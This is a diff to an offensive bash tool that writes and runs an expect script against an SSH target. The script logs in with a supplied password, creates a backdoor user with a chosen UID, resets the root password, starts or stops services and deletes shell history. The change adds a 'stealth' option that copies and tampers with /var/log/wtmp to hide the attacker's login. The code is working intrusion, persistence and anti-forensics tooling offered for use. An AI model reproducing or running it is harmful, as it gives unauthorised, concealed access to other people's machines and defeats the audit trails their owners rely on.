@@ -9,37 +9,38 @@ if [ "$1" = "-h" -o "$1" = "--help" ]; then
 	echo -e "\nUsage: $0 [user@host]|[user@host:port] [password] [options]"
 	echo -e "\n	Example: $0 root@1.2.3.4 toor"
 	echo -e "	Example: $0 root@1.2.3.4:2222 toor\n"
-	echo -e "Invoking the script without any parameters will enter the script in manual configuration mode\n"
+	echo -e "Invoking the script without any parameters will enter the script in manual\nconfiguration mode.\n"
 	echo "	-h, --help"
-	echo -e "			Print this help information.\n"
+	echo -e "		Print this help information.\n" ############################
 	echo "	-B, --build-only"
-	echo "			Specifying this option will only build the"
-	echo "			script and not execute after building it. This can be"
-	echo -e "			useful when preparing an expect script for later use.\n"
+	echo "		Only build the expect script but do not execute it. This can"
+	echo "		be useful when preparing the script for later use. By default"
+	echo -e "		the script builds and executes the expect script.\n"
 	echo "	-n, --name <username_here>"
-	echo "			Allows user to specify the name of the backdoor user"
-	echo -e "		that will be added on the target."
+	echo "		Specify the name of the backdoor user that will be added on"
+	echo -e "		the target.\n"
 	echo "	-p, --port X"
-	echo "			Allows user to specify which port SSH is running on"
-	echo -e "			the target.\n"
+	echo -e "		Specify the SSH port on the target.\n"
 	echo "	-P, --password <your_password_here>"
-	echo "			Allows user to specify which password the backdoor"
-	echo -e "			user will have on the remote target.\n"
+	echo "		Specify which password the backdoor user will have on the"
+	echo -e "		remote target.\n"
 	echo "	-r, --root-password <your_password_here>"
-	echo "			Allows user to specify the new root password on the"
-	echo -e "			target.\n"
+	echo -e "		Specify the new root password on the target.\n"
 	echo "	-s,overwrite|append service1,service2"
-	echo "			Allows user to specify which services are started on"
-	echo "			the target. The overwrite option means user overwrite"
-	echo "			the default services the script has configured. The"
-	echo "			append option allows user to add to the services"
-	echo -e "			already configured.\n"
+	echo "		Specify which services are started on the target. The overwrite"
+	echo "		option means the preconfigured services will be overwritten."
+	echo "		The append option adds services to the ones already"
+	echo -e "		preconfigured in the script.\n"
 	echo "	-S,overwrite|append service1,service2"
-	echo "			Same as the -s option but this is for the services"
-	echo -e "			to be stopped on the target.\n"
+	echo "		Same as the -s option but this is for the services to be"
+	echo -e "		stopped on the target.\n"
+	echo "	-t, --stealth"
+	echo "		Enable manipulation of login history on target in order to"
+	echo "		remove history of our login. This option uses SCP twice and"
+	echo "		therefore adds extra time. This option should not be used if"
+	echo -e "		time is of the essence.\n"
 	echo "	-u, --userid X"
-	echo "			This option allows user to specify what user want the"
-	echo -e "			UID of backdoor user to be when added on the target.\n"
+	echo -e "		Specify the UID of the backdoor user to be added on the target.\n"
 	exit 0
 fi
 
@@ -108,6 +109,9 @@ if [ $# -gt 0 ]; then
 					serviceStop="$serviceStop ${2//,/ }"
 				fi
 				;;
+			*-t|--stealth*)
+				alterLastHistory="yes"
+				;;
 			*-u|--userid|--uid*)
 				newUserID=$2
 				;;
@@ -134,17 +138,18 @@ if [ ${#port} -lt 1 ]; then #if no port given, make default 22
 fi
 
 echo "#!/usr/bin/expect" > $expectFile #write shebang to file
+echo "set prompt \":|#|\\\\\\$\"" >> $expectFile #set prompt var in script
 
 if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
 	/bin/cat <<SCP >> $expectFile
 spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
 expect yes/no { send yes\r; exp_continue}
-expect "*assword*"
+interact -o -nobuffer -re \$prompt return
 send "$pass\r"
 expect "100%"
 sleep 1
 spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
-expect "*assword*"
+interact -o -nobuffer -re \$prompt return
 send "$pass\r"
 expect "100%"
 sleep 1
@@ -154,7 +159,6 @@ fi
 /bin/cat <<LOGIN >> $expectFile
 spawn ssh -p $port $firstArg
 expect yes/no { send yes\r; exp_continue}
-set prompt ":|#|\\\\\\$"
 interact -o -nobuffer -re \$prompt return
 send "$pass\r"
 LOGIN
@@ -231,9 +235,8 @@ send "history -d \`history | wc -l\`; exit\r"
 interact
 BOTTOM
 
-echo "Attempting login..."
 if [ "$buildOnly" != "no" ]; then
+	echo "Attempting login..."
 	/usr/bin/expect myfile.exp
+	echo "Completed."
 fi
-echo "Completed."
-
